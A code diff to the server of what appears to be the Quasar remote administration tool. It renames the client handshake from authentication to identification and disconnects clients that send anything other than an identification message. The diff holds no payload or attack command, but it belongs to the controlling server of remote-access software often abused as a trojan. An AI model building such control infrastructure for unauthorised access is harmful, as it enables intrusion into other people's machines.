@@ -6,11 +6,11 @@ namespace Quasar.Server.Core.Networking
     public class QuasarServer : Server
     {
         /// <summary>
-        /// Gets the clients currently connected and authenticated to the server.
+        /// Gets the clients currently connected and identified to the server.
         /// </summary>
         public Client[] ConnectedClients
         {
-            get { return Clients.Where(c => c != null && c.Authenticated).ToArray(); }
+            get { return Clients.Where(c => c != null && c.Identified).ToArray(); }
         }
 
         /// <summary>
@@ -74,17 +74,12 @@ namespace Quasar.Server.Core.Networking
         /// <param name="connected">True if the client connected, false if disconnected.</param>
         private void OnClientState(Server server, Client client, bool connected)
         {
-            switch (connected)
+            if (!connected)
             {
-                case true:
-                    client.Send(new GetAuthentication()); // begin handshake
-                    break;
-                case false:
-                    if (client.Authenticated)
-                    {
-                        OnClientDisconnected(client);
-                    }
-                    break;
+                if (client.Identified)
+                {
+                    OnClientDisconnected(client);
+                }
             }
         }
 
@@ -96,26 +91,25 @@ namespace Quasar.Server.Core.Networking
         /// <param name="message">The received message.</param>
         private void OnClientRead(Server server, Client client, IMessage message)
         {
-            var type = message.GetType();
-
-            if (!client.Authenticated)
+            if (!client.Identified)
             {
-                if (type == typeof (GetAuthenticationResponse))
+                if (message.GetType() == typeof (ClientIdentification))
                 {
-                    AuthenticateClient(client, (GetAuthenticationResponse) message);
-                    client.Authenticated = AuthenticateClient(client, (GetAuthenticationResponse)message);
-                    if (client.Authenticated)
+                    client.Identified = IdentifyClient(client, (ClientIdentification) message);
+                    if (client.Identified)
                     {
-                        client.Send(new SetAuthenticationSuccess()); // finish handshake
+                        client.Send(new ClientIdentificationResult {Result = true}); // finish handshake
                         OnClientConnected(client);
                     }
                     else
                     {
+                        // identification failed
                         client.Disconnect();
                     }
                 }
                 else
                 {
+                    // no messages of other types are allowed as long as client is in unidentified state
                     client.Disconnect();
                 }
                 return;
@@ -124,7 +118,7 @@ namespace Quasar.Server.Core.Networking
             MessageHandler.Process(client, message);
         }
 
-        private bool AuthenticateClient(Client client, GetAuthenticationResponse packet)
+        private bool IdentifyClient(Client client, ClientIdentification packet)
         {
             if (packet.Id.Length != 64)
                 return false;
